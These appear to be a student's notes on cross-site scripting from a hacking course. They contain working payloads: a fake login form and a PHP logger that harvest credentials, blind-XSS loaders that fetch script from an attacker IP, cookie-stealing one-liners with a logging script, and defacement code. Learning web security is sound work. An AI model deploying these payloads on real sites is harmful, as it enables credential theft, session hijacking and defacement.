# xss
* cross site scripting
* browser based vulnerabilities
* inject javascript in poorly santized input
* stored persistent XSS
  * user input stored in backend to be displaye dot others
* Reflected XSS
  * non persistent, user input displayed on page after being process but without being stored
* DOM based XSS
  * non persistent, input directly shown in the rbwoser and completely process by client side without reaching the server

## Stored XSS
* if the xss payload is stored, the attack is persistent and can effect other users
* <script>alert(window.origin)</script> can tell you if xss is executed, and where it is executed
  * many browser use IFrames for input, so if webform is vulnerable it doesnt impace main site. Using the alert window.origin tells us the URL being executed on
* <script>print()</script>  also works
* remember to confirm that our code is in the webpage by using inspect element

## Non persistent XSS
* reflected XSS:
  * input reaches server, returned to us without sanitization
  * they are not persistent
  * how can this be used to target victims then?
  * sometimes inputs are stored in the query of the url
  * we can give them a url with the query containing our xss
  * confirm this with network view in the developer tools

* DOM xss
  * completely processed client side using JS
  * if input parameter in URL uses #, it is handled by the browser. No requests made to backend
  * when browser is refreshed, the data disappears
  * Source and Sink
    * Source is javascript object taking user input, any input 
    * Sink is function writing user input to DOM object. If sink not santiizing input, its vulnerable to XSS
      * `document.write()`
      * `DOM.innerHTML`
      * `DOM.outerHTML`
      * in jquery
        * `add()`
        * `after()`
        * `append()`
    * if a page uses these without sanitizing, it is vulnerable
    * these dont tend to allow <script> tags though
    * so we have to use a new method
    * <img src="" onerror=alert(window.origin)>
    * 

## XSS Discovery
* automated discovery
  * tools like nessus, burp pro, zap
  * passive scan: view client side code to find DOM vectors
  * active scan: send payloads via http to find persistent or reflective vectors
  * `xss strike` is open source and free for this purpose
* manual discovery
  * manual xxs discovery
  * for simple attacks, just testing randomly on enemy system is good enough
  * in more advanced situations, you need to develop code review skill

### XSS Payloads
* XSS can be injected inbto any HTML page, not just input fields. HTTP headers, cookies, user agents, etc, can be used. CSS Style attributes work sometimes too
* code review

### Defacement
* damaging website frontent using persistent XSS
* three html things to change the website look:
  * backgroudn color: document.body.style.background
  * background: document.body.background
  * page title: document.title
  * page text: DOM.innerHTML
* after doing our defacement, its best to also get rid of the vulnerability ourselves in order to make changing back harder
#### changing background
* <script>document.body.style.background = "#141d2b"</script>

#### changing page title
* <script>document.title = 'HackTheBox Academy'</script>

#### changing page text
* <script>document.getElementById("todo").innerHTML = "New Text"</script> will change  an element
* or with jquery
  * $("#todo").html('New Text');
* <script>document.getElementsByTagName('body')[0].innerHTML = "New Text"</script> will change the elemtn by tag name, in this case the hwole body
  * [0] means first body element
* instead of doing one thing at a time, we could also just use innerHTML to change entire webpage to our will
* also test our payload.. to make sure it works!!!
* <script>document.getElementsByTagName('body')[0].innerHTML = 'penis man was here'</script>

### Phishing
* Phishing utilize legitimate information to trick victims into sending information
* XSS phishing is done by injecting fake login forms which send login details to attacker server
* allows login on behalf of user

here is some such code

<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>

also, you can load remote code with:

<script src="http://OUR_IP/script.js"></script>

* this creates a form on the wesbite, with the action to send the information back to our ip
* in order to deploy this payload, we can do `document.write(payload)`
  * document.write('<h3>Please login to continue</h3><form action=http://10.10.15.14><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')
* to remove other elements, use `document.getElementById(element id).remove()`
* to get rid of other things, use comments
* to set up a listener, we just use nc to listen on port 80
* probably not a good idea to put your own ip on the website, good way to get caught!!!
* if we just use nc though the webpage will return an unable to connect error
* we should use a php script that logs credentials and redirects to the original page

<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>

* simple php script receives request, extract username and password, write to file, then redirect using the header function
* 

### SEssion hijacking
* web apps use cookies to maintain connection and authentication
* if we hijack cookies, we can steal their login session

#### blind XSS vulnerabiltiies
* when the vulnerability is on a page we cannot access
* forms only accessible by admins or something
* contact forms, reviews, user details, tickets, https user agent headers
* say we submit a form to be reviewed by an admin. WE cant see how the admin's client handles the input, so what gives?
* to detect vulnerabilities, put our code in the request. This code will send a message to our server, and if we receive something, the webpage is vulnerable
  * how do we know which field is vulnerable?
  * what xss payload to use?
* using the remote code execution method, getting the code from a file on our system dynamically, can help us test different methods
* if we rename the script to whichever field we are testing against, then we know the field name if we get a request from that script


<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>

* good to encapsulate multiple payloads into one for redundancy
* we shoudl also consider the field type we are attacking
  * email fields usually require email formatted strings
  * passwords dont store in plaintext

### cookie grabbing
```
  document.location='http://OUR_IP/index.php?c='+document.cookie;
``````
  new Image().src='http://10.10.15.14/index.php?c='+document.cookie;
```
the first of these navigates to a cookie grabber page, the second displays an image (which captures our cookie by embedding our php source file)

this script will do the job
`<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>`

* separates cookies into a list so that they can be printed pretty
* when we steal the cookie, we go to storage and paste it in place of our own

## XSS Defense
* we should defend user IO on websites
* input sanitization is especially important
* DOMPurify can prevent javascript code from entering our ecosystem
* we should never use input directly within javascript code, css code, tag or attribute fields, or comments
* dont use vulnerable javascript functions